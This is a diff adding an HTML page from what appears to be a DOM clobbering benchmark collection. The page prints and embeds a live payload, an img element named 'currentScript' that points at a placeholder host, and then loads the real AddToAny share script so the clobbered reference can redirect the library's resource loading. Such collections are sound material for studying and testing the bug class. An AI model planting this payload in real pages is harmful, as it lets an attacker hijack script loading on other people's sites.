@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>DOM Clobbering Micro Benchmarks</title>
+    <link rel="stylesheet" href="../styles/styles.css">
+    <style>
+        /* Ensure that long lines in <pre> tags wrap */
+        pre {
+            white-space: pre-wrap;       /* CSS3 */
+            white-space: -moz-pre-wrap;  /* Mozilla */
+            white-space: -pre-wrap;      /* Opera 4-6 */
+            white-space: -o-pre-wrap;    /* Opera 7 */
+            word-wrap: break-word;       /* IE */
+        }
+    </style>
+</head>
+<body>
+<h1>DOM Clobbering Collection - addtoany</h1>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Payload</span><br><br>
+  <pre>&lt;img src=&quot;https://addtoany.xxx.xxx&quot; name=&quot;currentScript&quot;&gt;</pre>
+  <img src="https://addtoany.xxx.xxx" name="currentScript">
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <p><span class="label">Library</span><br><br>
+  <pre>&lt;script async src=&quot;https://static.addtoany.com/menu/page.js&quot;&gt;&lt;/script&gt;</pre>
+  <script async src="https://static.addtoany.com/menu/page.js"></script>
+  </div>
+</section>
+
+<section class="section">
+  <div class="column">
+  <a href="../doomcaptcha/poc.html">Next: doomcaptcha</a>
+  </div>
+</section>
+
+</body>
+</html>
